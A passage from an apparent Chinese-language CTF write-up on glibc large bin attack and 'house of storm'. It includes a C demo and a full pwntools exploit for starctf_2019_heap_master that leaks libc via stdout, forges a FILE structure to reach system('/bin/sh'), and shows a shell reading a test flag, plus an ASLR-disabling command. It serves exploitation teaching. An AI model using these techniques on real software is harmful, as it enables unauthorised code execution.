<li>首先保证largebin中有一个chunk(size&gt;0x400)</li>
<li>unsortedbin中有一个比较大的chunk(size&gt;当前laregbin中已有的chunk)</li>
</ul>
<p>然后就可以到达这个分支。</p>
<p><strong>原因：将chunk从unsortedbin中插入到largebin中缺少一些检查</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>2.23 ~ 2.29版本中largebin attack的利用点，在2.30及以后的版本中，加入了双链表检测，所以在libc2.30及以后，该处的largebin attack无法使用了。</p>
<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><ul>
<li>构造2个堆：1个大小为unsorted bin范围的chunk，比如0x100，1个大小为large bin范围的，比如0x410，中间再加上其他堆用于隔离防止合并。</li>
</ul>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><ul>
<li>free这两个chunk， frees顺序为 <code>free(0x410)</code>、<code>free(0x100)</code>，然后malloc(0x100)，这样可以保证在遍历到0x100这个合适的chunk时，能够优先从large bin范围的chunk，得到了一个large bin。</li>
</ul>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><ul>
<li>构造2个堆：1个大小为unsorted bin范围的chunk，比如0x100，1个大小为large bin范围的但是比现在的large bin里的chunk要大，比如0x410 + 0x10 &#x3D; 0x420。</li>
</ul>
<h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><ul>
<li>free这两个chunk， free顺序为 <code>free(0x420)</code>、<code>free(0x100)</code>，此时，堆布局为large bin里一个0x410的chunk，unsorted bin里一个0x420的未归位的large bin，并且未归位的这个0x420的chunk与0x410的large bin属于同一个index。</li>
</ul>
<h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><ul>
<li>UAF或其他漏洞，控制large bin里那个chunk的bk和bk_nexsize。</li>
</ul>
<h4 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h4><ul>
<li>malloc(0x100)，使得malloc遍历unsorted bin，将0x420的chunk放入large bin，发生large bin attack。</li>
</ul>
<h2 id="Large-bin-attack的利用"><a href="#Large-bin-attack的利用" class="headerlink" title="Large bin attack的利用"></a>Large bin attack的利用</h2><h3 id="结合IO-FILE-hijack"><a href="#结合IO-FILE-hijack" class="headerlink" title="结合IO_FILE hijack"></a>结合IO_FILE hijack</h3><ul>
<li>利用large bin attack的任意地址写漏洞特性，错误地将IO 2 1 stdout内部的<code>_IO_write_base</code>修改为0，使得程序调用puts等函数时，能够影响泄露出libc地址，这也就是劫持了stdout。</li>
</ul>
<h3 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h3><ul>
<li>传统的house of orange是利用unsorted bin attack将IO_list全写一个<code>main_arena + 88</code>地址，然后通过<code>chain_next</code>进行转移，而large bin attack更加方便，直接在IO_list全写上一个堆地址，进而伪造IO_FILE结构。</li>
</ul>
<h3 id="Hijack-global-fastmax"><a href="#Hijack-global-fastmax" class="headerlink" title="Hijack global_fastmax"></a>Hijack global_fastmax</h3><ul>
<li>通过large bin attack将<code>global_max_fast</code>修改为一个堆地址，导致free任何chunk，都将放入fastbin，从而利用fastbin attack达到任意地址分配。</li>
</ul>
<h3 id="House-of-strom"><a href="#House-of-strom" class="headerlink" title="House of strom"></a>House of strom</h3><p>理解了large bin attack，接下来，我们就可以来看house of strom了，house of strom可以实现任意地址分配，看看前面的这道题，我们是将一个合法的unsorted bin chunk链接到unsorted bin里未归位的large bin chunk的bk处，假设，我们将一个任意地址比如addr链接到unsorted bin里未归位的large bin chunk的bk处，然后执行large bin attack会发生什么。</p>
<p>那么，在large bin attack阶段不会有问题，只是接下来，继续遍历，取到我们链接上的这个chunk时，检查其size，不符合要求然后崩溃。我们可以利用前面的large bin attack，先将addr处的size的位置写上一个堆指针，我们可以利用错位法，这样，在size处留下了chunk地址值的第6字节数据，在开启PIE的情况下，一般为0x55为0x56，这样，我们malloc(0x40)，遍历到第一个未归位的large bin chunk时，发生large bin attack，接下来遍历到后面这个任意地址的chunk时，发现size符合要求，直接返回给用户，就可以成功把这个任意地址的空间申请过来。</p>
<h2 id="House-of-strom-1"><a href="#House-of-strom-1" class="headerlink" title="House of strom"></a>House of strom</h2><h3 id="House-of-strom原理"><a href="#House-of-strom原理" class="headerlink" title="House of strom原理"></a>House of strom原理</h3><p>该利用手法适用于glibc 2.28及以下的版本，因为unsorted bin attack在glibc 2.29中已失效。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里是关于largebin_attack的重点</span></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="comment">//从bk开始遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);<span class="comment">//获得当前要操作的chunk的size</span></span><br><span class="line">......</span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line"><span class="comment">//只进行检查了chunk的size == nb（nb申请的大小）</span></span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">    <span class="comment">//这里会直接返回p,p就是victim,victim = unsorted_chunks (av)-&gt;bk</span></span><br><span class="line">    <span class="comment">//victim又是unsorted_chunks的bk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，我们将house of strom里的步骤改一下，将0x100的unsorted bin转换成任意地址，即通过修改unsorted bin里未归位的large bin的bk指针指向任意地址addr，然后修改large bin里有的那个chunk的bk_nexsize为addr - 0x18 - 0x5（错位写入堆地址）。</p>
<p>通过malloc(0x40)即可分配到任意地址addr + 0x10处，这里是因为large bin attack里victim-&gt;bk_nexsize-&gt;fd_nexsize &#x3D; victim即(addr - 0x18 - 0x5) + 0x18 &#x3D; victim，即addr - 0x5 &#x3D; victim。在PIE下，victim地址一般为0x55或0x56开头，并且有6字节有效数据，此时，即相当于*(char *)(addr - 0x5 + 0x5) &#x3D; (addr &gt;&gt; 40) &amp; 0xFF，也就是在addr处写入了0x55或0x56，可以用来充当unsorted bin的size，这样，接下来继续回溯unsorted bin时，仅检查size是否符合请求的一样，一样就可以直接返回这个地址，实现任意地址分配。</p>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">//将p1放入large bin</span></span><br><span class="line">   <span class="built_in">free</span>(p2); <span class="comment">//p2放入unsorted bin   </span></span><br><span class="line">   <span class="type">size_t</span> addr = (<span class="type">size_t</span>)(buf - <span class="number">0x10</span>);</span><br><span class="line">   *(<span class="type">size_t</span> *)(p1+<span class="number">0x8</span>) = addr + <span class="number">0x8</span>; <span class="comment">//修改large bin的bk</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(p1 + <span class="number">0x18</span>) = addr - <span class="number">0x18</span> - <span class="number">0x5</span>; <span class="comment">//修改large bin的bk_nextsize</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(p2 + <span class="number">0x8</span>) = addr;<span class="comment">//修改unsorted bin的bk</span></span><br><span class="line">   <span class="type">char</span> *p = <span class="built_in">malloc</span>(<span class="number">0x48</span>); <span class="comment">//申请到addr处</span></span><br><span class="line">   <span class="built_in">strcpy</span>(p,<span class="string">&quot;hello,welcome to pwn world\n&quot;</span>);</span><br><span class="line">   write(<span class="number">1</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="starctf-2019-heap-master"><a href="#starctf-2019-heap-master" class="headerlink" title="starctf_2019_heap_master"></a>starctf_2019_heap_master</h3><p>ubuntu16.04，glibc2.23&#x2F;glibc2.25</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctf@70b53f87c516:~/pwn/实验脚本$ checksec starctf_2019_heap_master</span><br><span class="line">[*] <span class="string">&#x27;/home/ctf/pwn/实验脚本/starctf_2019_heap_master&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<h4 id="ida静态分析"><a href="#ida静态分析" class="headerlink" title="ida静态分析"></a>ida静态分析</h4><h5 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h5><p><img data-src="/../images/image-20250327214259281.png" alt="image-20250327214259281"></p>
<h5 id="prog-init"><a href="#prog-init" class="headerlink" title="prog_init()"></a>prog_init()</h5><p><img data-src="/../images/image-20250327214321585.png" alt="image-20250327214321585"></p>
<h5 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h5><p><img data-src="/../images/image-20250327214413213.png" alt="image-20250327214413213"></p>
<p>add()函数，只能malloc()，而不存堆指针</p>
<h5 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h5><p><img data-src="/../images/image-20250327214449386.png" alt="image-20250327214449386"></p>
<p>delete()函数，只能free heap_base范围内的</p>
<h5 id="edit"><a href="#edit" class="headerlink" title="edit()"></a>edit()</h5><p><img data-src="/../images/image-20250327214738926.png" alt="image-20250327214738926"></p>
<p>edit()函数也是只能改heap_base范围内的</p>
<p>程序功能上看：</p>
<ul>
<li>程序不能控制add()中malloc()出来的chunk</li>
<li>edit()和delete()只能在heap_base范围内</li>
<li>漏洞点在于可以delete()后继续编辑堆，uaf</li>
</ul>
<p><strong>重点关注的是：这道题的目的之一是让我们在heap_base的范围上去布局堆内存</strong></p>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>程序没有show功能，并且开启了PIE，第一步应该该泄露地址，程序里有调用puts等函数，因而可以hijack IO_2_1_stdout，这里可以用unsorted bin attack或者large bin attack，如果用了unsorted bin attack，后续的利用将无法继续，因为unsorted bin被破坏了，因此，我们选择large bin attack来攻击IO_2_1_stdout。</p>
<p>对于篡改IO_2_1_stdout来泄露数据，flags有要求，必须得经过这两个if，才能到达后方调用syswrite将_IO_write_base与_IO_write_ptr之间的数据信息泄露出来，这就要求flags的<strong>低1字节的低4位不能为8</strong>，<strong>第二字节的低4位必须要为8</strong>，也就是说，我们的unsorted bin chunk地址末尾地址应该为0x800这样。</p>
<p>从以上分析来看，large bin attack攻击IO_2_1_stdout是最为合适的，因为需要修改IO_2_1_stdout里的两处内容，即flags和_IO_write_base。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>一次运行可能会不成功，这是因为hijack_stdout时需要爆破一个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">_IO_2_1_stdout_s = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里用lambda表达式我的机器会过不了交互</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">offset,size,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;offset:&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">offset</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;offset:&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造8个chunk</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0x420</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0x440</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0x880</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>) + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">edit(<span class="number">0xCB0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">edit(<span class="number">0xD60</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0xD80</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#释放0，进入unsortedbin中</span></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#malloc_consolidate将0放入large bin</span></span><br><span class="line">add(<span class="number">0x430</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来，为了在bk和bk_nextsize处留下libc指针，我们要继续伪造unsorted bin</span></span><br><span class="line"><span class="comment">#在bk_nextsize处留下libc指针</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xF0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) * <span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在bk留下libc指针</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xC1</span>))</span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0xB0</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改large bin的bk，指向stdout</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#修改large bin的bk_nextsize，指向_IO_write_base</span></span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s + <span class="number">0x20</span> - <span class="number">0x20</span> - <span class="number">0x7</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#在这里可以理解一下house of storm的任意地址写是堆glibc源码中哪个位置写</span></span><br><span class="line"><span class="comment">#恢复large bin的头size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#3放入unsorted bin，3属于未归位的large bin</span></span><br><span class="line">delete(<span class="number">0x890</span>)</span><br><span class="line"><span class="comment">#0x90的堆放入unsorted bin    </span></span><br><span class="line">delete(<span class="number">0xCE0</span>)</span><br><span class="line"><span class="comment">#遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">_IO_list_all_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">_IO_str_finish_ptr_addr = libc_base + <span class="number">0x3c34b0</span></span><br><span class="line">lg(<span class="string">&#x27;_IO_list_all_addr&#x27;</span>,_IO_list_all_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh_addr&#x27;</span>,binsh_addr)</span><br><span class="line">lg(<span class="string">&#x27;_IO_str_finish_ptr_addr&#x27;</span>,_IO_str_finish_ptr_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#house of orange glibc2.24-2.27</span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment">#vtable -&gt; _IO_strn_jumps - 0x8</span></span><br><span class="line">fake_file += p64(_IO_str_finish_ptr_addr - <span class="number">0x18</span>) <span class="comment">#vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system_addr)   </span><br><span class="line">delete(<span class="number">0xCE0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="built_in">len</span>(fake_file),fake_file) <span class="comment">#修改unsorted bin内容</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>打本地的时候<code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0</span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">$ <span class="built_in">cat</span> /flag</span><br><span class="line">[DEBUG] Sent 0xa bytes:</span><br><span class="line">    b<span class="string">&#x27;cat /flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;this_is_a_test_flag&#125;\n&#x27;</span></span><br><span class="line">flag&#123;this_is_a_test_flag&#125;</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span> (pid 485)</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span> (pid 483)</span><br></pre></td></tr></table></figure>

<h4 id="exp拆分讲解"><a href="#exp拆分讲解" class="headerlink" title="exp拆分讲解"></a>exp拆分讲解</h4><h5 id="在heapbase布局堆内存"><a href="#在heapbase布局堆内存" class="headerlink" title="在heapbase布局堆内存"></a>在heapbase布局堆内存</h5><p>布局了0x421,0x431,0x91大小的堆内存，其他的0x21是用来隔离的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#伪造8个chunk</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0x420</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0x440</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0x880</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>) + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">edit(<span class="number">0xCB0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">edit(<span class="number">0xD60</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0xD80</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<h5 id="将第一个chunk放入largebin中"><a href="#将第一个chunk放入largebin中" class="headerlink" title="将第一个chunk放入largebin中"></a>将第一个chunk放入largebin中</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#释放0，进入unsortedbin中</span></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#malloc_consolidate将0放入large bin</span></span><br><span class="line">add(<span class="number">0x430</span>)</span><br></pre></td></tr></table></figure>

<h5 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h5><p>largebin_attack就要对large_chunk的bk和bk_nextsize进行修改，这道题目中我们可以不断的通过edit()对heap_base那块内存进行修改和利用 unsortedbin 机制留下libc地址，而我们知道在unsortedbin中只有一个chunk时，必定会在这个chunk的bk，fd上留下libc的地址，所以我们要对这个large_chunk进行修改使它经过多次free()的机制留下libc地址</p>
<p>接下来，为了在bk和bk_nextsize处留下libc指针，我们要继续伪造unsorted bin</p>
<blockquote>
<p>这里为什么留下libc的地址呢？</p>
<p>因为我们要劫持_IO_2_1_stdout_，它也是libc中的地址也在main_arena中，而且低3位是不会变化的，所以我们可以通过低字节覆盖，这样就只剩下一位需要爆破，概率1&#x2F;16</p>
</blockquote>
